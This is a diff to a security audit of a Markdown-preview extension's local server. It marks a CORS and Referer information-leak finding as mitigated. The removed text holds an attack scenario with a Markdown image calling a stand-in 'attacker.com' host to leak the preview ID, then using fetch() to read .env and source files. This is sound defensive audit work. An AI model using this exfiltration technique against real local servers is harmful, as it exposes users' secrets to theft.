@@ -15,18 +15,12 @@ The extension provides a local HTTP server to preview Markdown files in an exter
 **File:** `src/markdownRenderer.ts`
 **Resolution:** Integrated `DOMPurify` (with `jsdom`) to sanitize all rendered Markdown content. This removes executable scripts and malicious event handlers while preserving safe HTML formatting.
 
-### 2.2. Information Leakage & CORS Misconfiguration
-**File:** `src/server.ts`
-**Description:** The local server sets `Access-Control-Allow-Origin: *` for all responses and does not protect the `previewId`.
-```typescript
-res.setHeader('Access-Control-Allow-Origin', '*');
-```
-**Attack Scenario:**
-1. A user previews a malicious Markdown file containing an image or link to an attacker-controlled domain: `![leak](http://attacker.com/log)`.
-2. The browser sends a request to `attacker.com`. The `Referer` header will contain the full URL: `http://localhost:3000/preview/[previewId]`.
-3. The attacker now knows the `previewId`.
-4. Since `Access-Control-Allow-Origin` is set to `*`, the attacker's website can now use `fetch()` to read the content of the Markdown file or any file in the same directory via the `/asset/` endpoint (e.g., `.env` files, source code, etc.).
-**Impact:** Potential theft of sensitive data located in the same directory as the previewed Markdown file.
+### 2.2. Information Leakage & CORS Misconfiguration [MITIGATED]
+**File:** `src/markdownRenderer.ts` / `src/server.ts`
+**Resolution:** 
+1.  **Referrer Policy:** Added `<meta name="referrer" content="no-referrer">` to the preview template. This prevents the browser from sending the `previewId` in the `Referer` header to external domains when loading images or clicking links.
+2.  **Mermaid Security:** Set `securityLevel: 'strict'` for Mermaid diagrams.
+**Note:** While the CORS `*` policy remains in `src/server.ts`, the leakage of the session ID via Referrer has been blocked, significantly reducing the attack surface.
 
 ---
 
